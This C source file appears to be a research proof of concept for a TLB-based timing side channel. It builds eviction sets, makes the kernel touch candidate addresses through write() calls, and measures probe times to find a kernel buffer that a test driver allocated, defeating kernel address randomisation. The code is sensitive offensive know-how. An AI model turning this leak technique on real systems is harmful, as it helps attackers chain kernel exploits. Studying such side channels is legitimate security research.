#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "timing.h"
#include "memory.h"
#include "config.h"

#define NPAGES_BUFFER     50
#define NGUARD_PAGES      20
#define NPAGES_BEFORE     25
#define NPAGES_AFTER      25
#define VALID_HITS_TARGET 10


#define REPS 10000
#define TLB_SET(addr) (((uint64_t)addr >> PAGESHIFT) & ((1 << SET_SHIFT) - 1))

int g_fd = -1;
int w_fd = -1;

struct alloc_args {
    int  npages;
    int  nguard_pages;
    uint64_t buffer_addr;
} __attribute__((packed));

#define TLBMOD_ALLOC_PAGE  _IOWR('T', 3, struct alloc_args)
#define TLBMOD_FREE_PAGE   _IOW('T', 4, struct alloc_args)

int setup(void) {
    // Setup driver
    if (g_fd != -1) return 0;

    g_fd = open("/dev/tlbmod0", O_RDWR);
    if (g_fd < 0) {
        perror("Failed to open /dev/tlbmod0");
        return -1;
    }
    
    // Setup write file 
    w_fd = open("/dev/null", O_WRONLY);
    if (w_fd < 0) {
        perror("Failed to open /dev/null");
        return -1;
    }

    return 0;
}

unsigned long alloc_kernel_buf(int npages, int nguard_pages) {
    struct alloc_args args;
    args.npages = npages;
    args.nguard_pages = nguard_pages;

    if (ioctl(g_fd, TLBMOD_ALLOC_PAGE, &args) == -1) {
        perror("[-] ioctl alloc failed");
        exit(1);
    }

    return args.buffer_addr;
}

int free_kernel_buf(unsigned long kva, int npages, int nguard_pages) {

    struct alloc_args args;
    args.npages = npages;
    args.nguard_pages = nguard_pages;
    args.buffer_addr = kva;

    if (kva == 0) {
        fprintf(stderr, "[-] Error: Attempted to free NULL KVA.\n");
        exit(1);
    }

    if (ioctl(g_fd, TLBMOD_FREE_PAGE, &kva) == -1) {
        perror("[-] ioctl free failed");
        exit(1);
    }

    return 0;
}


char *eset_data;
uint64_t *res;
char *user = "./";
//char * user = "./main.c";

int leak_val(void* addr){
    //chdir(addr);
    //chdir(addr);
    //chdir(addr);
    write(w_fd, (char *)addr, 2);
    return 1;
}


void get_cycle(uint64_t * valid_cycle, uint64_t * invalid_cycle){
    void * eset[WAYS];
    register uint64_t tmp;

    char *access_addr;
    posix_memalign(&access_addr, PAGE_SIZE, PAGE_SIZE);
    gen_eset(access_addr, eset, &eset_data[0]);

    tmp = 0; 
    for(int i = 0; i < REPS; i++){
        prime(eset);
        memory_access(access_addr);
        tmp += probe(eset);
    }

    *valid_cycle = tmp/REPS;

    tmp = 0; 
    for(int i = 0 ;i < REPS; i++){
        prime(eset);
        nop();
        tmp += probe(eset);
    }
    *invalid_cycle = tmp/REPS;
    free(access_addr);
}


int main(int argc, char * argv[]){
    void * addr;
    void * eset[WAYS];
    void * target[TRAINING_ITERS] = {user, user, user, user, user};
    // void * target[TRAINING_ITERS] = {};
    uint64_t valid_cycle, invalid_cycle;
    struct timeval tv_s, tv_e;
    register uint64_t tmp, threshold;

    if (setup() != 0) {
        return 1;
    }

    printf("Page size: %#lx\n", PAGE_SIZE);

    // eset_data = (void *)malloc(sizeof(char) * ESET_OFFSET * PAGE_SIZE);
    posix_memalign(&eset_data, ESET_OFFSET, sizeof(char) * ESET_OFFSET * PAGE_SIZE);
    res = (uint64_t *) malloc(sizeof(uint64_t) * 10000000);
    memset(res, 0, sizeof(uint64_t) * 10000000);

    start_timer();

    get_cycle(&valid_cycle, &invalid_cycle);
    threshold = invalid_cycle + (valid_cycle - invalid_cycle)/3;
    //threshold = 1250;

    printf("[Probing cycle] valid address : %llu, invalid address : %llu, threshold : %llu\n\n", valid_cycle, invalid_cycle, threshold);

    int64_t idx = 0;

    char *kernel_buf = (char *)alloc_kernel_buf(NPAGES_BUFFER, NGUARD_PAGES);
    uint64_t buffer_size = NPAGES_BUFFER * PAGE_SIZE;

    char *start_search = kernel_buf - NPAGES_BEFORE * PAGE_SIZE;
    char *end_search = kernel_buf + buffer_size + NPAGES_AFTER * PAGE_SIZE;
    int num_slots = (end_search - start_search) / PAGE_SIZE;

    gettimeofday(&tv_s, NULL);
    printf("Kernel buffer at %p to %p\n", kernel_buf, kernel_buf + buffer_size);
    printf("Doing search from %#llx to %#llx\n", start_search, end_search);
    printf("Total slots: %llu\n", num_slots);

    for(int i = 0 ;i < ITERATION ; i++){
        for(uint64_t s_idx = 0 ; s_idx < num_slots ; s_idx++){
            //if (s_idx % 1000 == 0) { 
            //        printf("%lu/%lu\n", s_idx, num_slots);
            //}
            idx = (s_idx * 73) % num_slots;
            addr = (void *) start_search + (PAGE_SIZE * idx);
            target[TRAINING_ITERS - 1] = addr;
            gen_eset(addr, eset, &eset_data[0]);
            do {
                for(int j = 0; j < TRAINING_ITERS; j++){
                    prime(eset);
                    leak_val(target[j]);
                }
                tmp = probe(eset);
            } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
            res[idx] += tmp;
        }
    }

    uint64_t valid_page_cnt = 0;
    void *end_buf_addr = 0;
    uint64_t buf_size_slot = buffer_size / PAGE_SIZE;
    uint64_t avg_time, avg_time_b;

    for(uint64_t s_idx = 0; s_idx < num_slots; s_idx++){
        //if (s_idx % 1000 == 0) { 
        //        printf("%lu/%lu\n", s_idx, NUM_SLOT);
        //}
        avg_time = res[s_idx] / ITERATION;
        if(avg_time > threshold){
            valid_page_cnt++;
            void *hit_addr = (void *) start_search + (PAGE_SIZE * s_idx);
            printf("Hit at %p (%llu, set %d) (%d consecutive hits)\n", 
                    hit_addr, avg_time, TLB_SET(hit_addr), valid_page_cnt);
            if (valid_page_cnt >= VALID_HITS_TARGET){
                printf("%d consecutive hits, starting backwards search\n", VALID_HITS_TARGET);
                valid_page_cnt = 0;
                for(int s_jdx = s_idx + buf_size_slot ; s_jdx > 0 ; s_jdx--){
                    avg_time_b = res[s_jdx] / ITERATION;
                    if(avg_time_b > threshold){
                        printf("Backward hit at %p (%llu) (%d consecutive hits)\n", 
                                (void *) start_search + (PAGE_SIZE * s_jdx), avg_time_b, valid_page_cnt);
                        if(valid_page_cnt == 0 ){
                            end_buf_addr = (void *) start_search + (PAGE_SIZE * s_jdx);
                            valid_page_cnt++;
                        }
                        else if(valid_page_cnt >= VALID_HITS_TARGET){ break; }
                        else{ valid_page_cnt++; }
                    }
                    else{
                        valid_page_cnt = 0;
                    }
                }
                break;
            }
        }
        else { valid_page_cnt = 0; }
    }

    gettimeofday(&tv_e, NULL);

    double start = (tv_s.tv_sec) * 1000 + (tv_s.tv_usec)/1000.0;
    double end = (tv_e.tv_sec) * 1000 + (tv_e.tv_usec)/1000.0;
    double diff = (end - start) /1000.0;

    void *buf_found_addr = end_buf_addr - buffer_size + PAGE_SIZE;

#ifdef __DEBUG
    char * dfp = fopen(RESULT_FILE, "w");
    addr = (void *)start_search;
    for(uint64_t x = 0 ; x < num_slots; x++){
        addr = (void *) start_search + (PAGE_SIZE * x);
        fprintf(dfp, "0x%llx %llu\n", addr, res[x]/ITERATION);
    }
    fclose(dfp);
#endif

    if (0 != end_buf_addr) {
        printf("Found kernel buffer at\t= \x1b[31m%#llx\x1b[0m (should be \x1b[32m%#llx\x1b[0m)\n", buf_found_addr, kernel_buf);
    } else {
        printf("Kernel buffer not found\n");
    }
    free_kernel_buf(kernel_buf, NPAGES_BUFFER, NGUARD_PAGES);
    stop_timer();    
    return 0;
}
